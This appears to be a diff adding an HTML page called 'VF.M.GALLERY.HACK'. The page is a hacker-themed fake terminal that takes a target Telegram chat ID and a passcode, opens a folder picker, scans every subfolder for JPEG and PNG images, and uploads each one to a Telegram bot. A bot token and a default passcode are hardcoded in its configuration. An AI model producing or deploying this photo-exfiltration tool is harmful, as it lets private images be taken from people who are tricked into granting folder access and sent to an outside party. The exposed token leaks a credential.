@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VF.M.GALLERY.HACK</title>
+    <style>
+        :root {
+            --hacker-green: #0f0;
+            --hacker-blue: #0af;
+            --hacker-red: #f00;
+            --hacker-yellow: #ff0;
+            --bg-dark: #111;
+            --bg-darker: #000;
+            --border-color: #333;
+        }
+        
+        body {
+            background-color: var(--bg-darker);
+            color: var(--hacker-green);
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        #terminal {
+            height: calc(100% - 40px);
+            overflow-y: auto;
+            padding-right: 15px;
+        }
+        
+        .prompt { color: var(--hacker-green); }
+        .system { color: var(--hacker-blue); }
+        .success { color: var(--hacker-green); }
+        .error { color: var(--hacker-red); }
+        .file { color: var(--hacker-yellow); }
+        .warning { color: var(--hacker-yellow); }
+        .input-line { color: var(--hacker-green); }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        
+        .progress-container {
+            margin: 10px 0;
+        }
+        
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+        }
+        
+        .progress-bar {
+            height: 3px;
+            background: var(--border-color);
+            width: 100%;
+        }
+        
+        .progress {
+            height: 100%;
+            background: var(--hacker-green);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        /* Scrollbar styling */
+        #terminal::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        #terminal::-webkit-scrollbar-track {
+            background: var(--bg-dark);
+        }
+        
+        #terminal::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 4px;
+        }
+        
+        /* Input line styling */
+        .input-line {
+            display: flex;
+            align-items: center;
+        }
+        
+        .input-line span {
+            margin-right: 10px;
+        }
+        
+        .input-line input {
+            background: transparent;
+            border: none;
+            color: var(--hacker-green);
+            font-family: 'Courier New', monospace;
+            flex-grow: 1;
+            outline: none;
+            caret-color: var(--hacker-green);
+        }
+    </style>
+</head>
+<body>
+    <div id="terminal"></div>
+
+    <!-- Hidden audio elements for sound effects -->
+    <audio id="typing-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-keyboard-typing-1386.mp3" preload="auto"></audio>
+    <audio id="enter-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-modem-connection-1713.mp3" preload="auto"></audio>
+    <audio id="success-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3" preload="auto"></audio>
+    <audio id="error-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-warning-alarm-688.mp3" preload="auto"></audio>
+    <audio id="hacking-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-sci-fi-ambience-222.mp3" preload="auto" loop></audio>
+    <audio id="transfer-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-data-transfer-1715.mp3" preload="auto"></audio>
+
+    <script>
+        // Configuration
+        const CONFIG = {
+            BOT_TOKEN: "7937308043:AAGfLTda1_5yRcgbSAYU2h5cGL70wv-N66E", // Set your bot token here
+            SECRET_PASS: "vfm1337", // Default password
+            COMMAND: "vfm.gllry.hck", // Default command
+            ALLOWED_TYPES: ['image/jpeg', 'image/png'],
+            ALLOWED_EXTENSIONS: ['.jpg', '.jpeg', '.png']
+        };
+
+        // DOM Elements
+        const terminal = document.getElementById('terminal');
+        
+        // Audio elements
+        const typingSound = document.getElementById('typing-sound');
+        const enterSound = document.getElementById('enter-sound');
+        const successSound = document.getElementById('success-sound');
+        const errorSound = document.getElementById('error-sound');
+        const hackingSound = document.getElementById('hacking-sound');
+        const transferSound = document.getElementById('transfer-sound');
+
+        // State variables
+        let currentStep = 0;
+        let chatId = "";
+        let dirHandle;
+        let isProcessing = false;
+        let currentInput = null;
+
+        // Play sound with volume control
+        function playSound(sound, volume = 0.3) {
+            sound.currentTime = 0;
+            sound.volume = volume;
+            sound.play().catch(e => console.log("Audio play failed:", e));
+        }
+
+        // Print to terminal
+        function print(text, className = '') {
+            const line = document.createElement('div');
+            line.className = className;
+            line.innerHTML = text;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        // Create input line
+        function createInput(promptText, callback) {
+            const inputLine = document.createElement('div');
+            inputLine.className = 'input-line';
+            inputLine.innerHTML = `
+                <span>${promptText}</span>
+                <input type="text" autofocus>
+            `;
+            terminal.appendChild(inputLine);
+            
+            const input = inputLine.querySelector('input');
+            input.focus();
+            
+            input.addEventListener('keydown', async (e) => {
+                if (e.key === 'Enter') {
+                    const value = input.value.trim();
+                    if (value !== '') {
+                        input.disabled = true;
+                        print(`<span class="input-line">${promptText} ${value}</span>`);
+                        inputLine.remove();
+                        await callback(value);
+                    }
+                }
+            });
+            
+            currentInput = input;
+        }
+
+        // Simulate typing effect with sound
+        async function typePrint(text, className = '', speed = 20) {
+            const line = document.createElement('div');
+            line.className = className;
+            terminal.appendChild(line);
+            
+            for (let i = 0; i < text.length; i++) {
+                line.innerHTML = text.substring(0, i+1);
+                terminal.scrollTop = terminal.scrollHeight;
+                
+                // Play typing sound randomly
+                if (Math.random() > 0.7) {
+                    playSound(typingSound, 0.1);
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, speed));
+            }
+        }
+
+        // Show loading animation with sound
+        async function showLoading(seconds = 2) {
+            playSound(hackingSound, 0.2);
+            
+            const dots = ['.', '..', '...'];
+            const loading = document.createElement('div');
+            loading.className = 'system';
+            terminal.appendChild(loading);
+            
+            for (let i = 0; i < seconds * 2; i++) {
+                loading.innerHTML = `PROCESSING${dots[i % 3]}`;
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            loading.remove();
+            hackingSound.pause();
+        }
+
+        // Welcome animation with sounds
+        async function showWelcome() {
+            playSound(hackingSound, 0.2);
+            
+            await typePrint("Initializing VF.M.GALLERY.HACK protocol...", "system", 10);
+            await typePrint("Bypassing security layers...", "system", 10);
+            await typePrint("Establishing encrypted connection...", "system", 10);
+            print("", "system");
+            await typePrint("Welcome to VF.M Terminal Interface", "success", 10);
+            playSound(successSound);
+            await typePrint(`Type '${CONFIG.COMMAND}' to begin`, "prompt", 10);
+            print("", "system");
+            
+            hackingSound.pause();
+            
+            // Initial input
+            createInput("root@vfm:~#", processCommand);
+        }
+
+        // Process command
+        async function processCommand(cmd) {
+            if (isProcessing) return;
+            
+            playSound(enterSound);
+            
+            switch(currentStep) {
+                case 0: // Main command
+                    if (cmd.trim() === CONFIG.COMMAND) {
+                        await showLoading();
+                        createInput("Enter TARGET_CHAT_ID:", processCommand);
+                        currentStep = 1;
+                    } else {
+                        playSound(errorSound);
+                        print(`<span class="error">ERROR: Invalid command. Type '${CONFIG.COMMAND}' to begin</span>`, "error");
+                        createInput("root@vfm:~#", processCommand);
+                    }
+                    break;
+                    
+                case 1: // Chat ID
+                    chatId = cmd.trim();
+                    await showLoading(1);
+                    createInput("Enter SECRET_PASSCODE:", processCommand);
+                    currentStep = 2;
+                    break;
+                    
+                case 2: // Password
+                    if (cmd.trim() === CONFIG.SECRET_PASS) {
+                        await showLoading(1);
+                        print("<span class='warning'>WARNING: This will access all gallery files</span>", "warning");
+                        createInput("Do you want to proceed? (Y/N)", processCommand);
+                        currentStep = 3;
+                    } else {
+                        playSound(errorSound);
+                        print("<span class='error'>ACCESS DENIED: Invalid passcode</span>", "error");
+                        currentStep = 0;
+                        createInput("root@vfm:~#", processCommand);
+                    }
+                    break;
+                    
+                case 3: // Confirmation
+                    if (cmd.trim().toUpperCase() === 'Y') {
+                        await startFileTransfer();
+                    } else {
+                        print("<span class='system'>Operation cancelled</span>", "system");
+                        currentStep = 0;
+                        createInput("root@vfm:~#", processCommand);
+                    }
+                    break;
+            }
+        }
+
+        // Start file transfer process
+        async function startFileTransfer() {
+            isProcessing = true;
+            playSound(transferSound, 0.2);
+            
+            try {
+                print("<span class='system'>Requesting gallery access...</span>", "system");
+                dirHandle = await window.showDirectoryPicker();
+                
+                print("<span class='system'>Scanning for media files...</span>", "system");
+                const files = await scanDirectory(dirHandle);
+                
+                if (files.length === 0) {
+                    playSound(errorSound);
+                    print("<span class='error'>No valid files found</span>", "error");
+                    return;
+                }
+                
+                print(`<span class='success'>Found ${files.length} media files</span>`, "success");
+                print("<span class='system'>Starting transfer...</span>", "system");
+                
+                // Create progress display
+                const progressContainer = document.createElement('div');
+                progressContainer.className = 'progress-container';
+                progressContainer.innerHTML = `
+                    <div class="progress-info">
+                        <span>TRANSFER PROGRESS:</span>
+                        <span id="progress-percent">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress" id="transfer-progress"></div>
+                    </div>
+                `;
+                terminal.appendChild(progressContainer);
+                const progressBar = document.getElementById('transfer-progress');
+                const progressPercent = document.getElementById('progress-percent');
+                
+                // Transfer files
+                let successCount = 0;
+                for (let i = 0; i < files.length; i++) {
+                    const file = files[i];
+                    print(`<span class="file">Transferring: ${file.name}</span>`, "file");
+                    
+                    // Update progress
+                    const progress = Math.round(((i + 1) / files.length) * 100);
+                    progressBar.style.width = `${progress}%`;
+                    progressPercent.textContent = `${progress}%`;
+                    
+                    // Play transfer sound occasionally
+                    if (i % 3 === 0) {
+                        playSound(transferSound, 0.1);
+                    }
+                    
+                    // Actual Telegram upload
+                    try {
+                        await uploadToTelegram(file, chatId, CONFIG.BOT_TOKEN);
+                        successCount++;
+                    } catch (err) {
+                        print(`<span class="error">Failed to upload ${file.name}: ${err.message}</span>`, "error");
+                    }
+                    
+                    // Small delay to prevent UI freeze
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                }
+                
+                playSound(successSound);
+                print(`<span class="success">Transfer complete! ${successCount}/${files.length} files sent to chat ${chatId}</span>`, "success");
+                
+            } catch (err) {
+                playSound(errorSound);
+                print(`<span class="error">ERROR: ${err.message}</span>`, "error");
+            } finally {
+                transferSound.pause();
+                isProcessing = false;
+                currentStep = 0;
+                createInput("root@vfm:~#", processCommand);
+            }
+        }
+
+        // Scan directory for files
+        async function scanDirectory(directory) {
+            const entries = [];
+            for await (const entry of directory.values()) {
+                if (entry.kind === 'file') {
+                    const file = await entry.getFile();
+                    if (isAllowedFile(file)) {
+                        entries.push(file);
+                    }
+                } else if (entry.kind === 'directory') {
+                    const subEntries = await scanDirectory(entry);
+                    entries.push(...subEntries);
+                }
+            }
+            return entries;
+        }
+
+        // Check if file is allowed
+        function isAllowedFile(file) {
+            const extension = file.name.substring(file.name.lastIndexOf('.')).toLowerCase();
+            return CONFIG.ALLOWED_TYPES.includes(file.type) || 
+                   CONFIG.ALLOWED_EXTENSIONS.includes(extension);
+        }
+
+        // Upload file to Telegram
+        async function uploadToTelegram(file, chatId, botToken) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('document', file);
+
+            const response = await fetch(
+                `https://api.telegram.org/bot${botToken}/sendDocument`,
+                { method: 'POST', body: formData }
+            );
+
+            const result = await response.json();
+            if (!result.ok) {
+                throw new Error(result.description || 'Upload failed');
+            }
+            return result;
+        }
+
+        // Initialize
+        showWelcome();
+
+        // Keep focus on input when clicking terminal
+        terminal.addEventListener('click', () => {
+            if (currentInput) {
+                currentInput.focus();
+            }
+        });
+    </script>
+</body>
+</html>
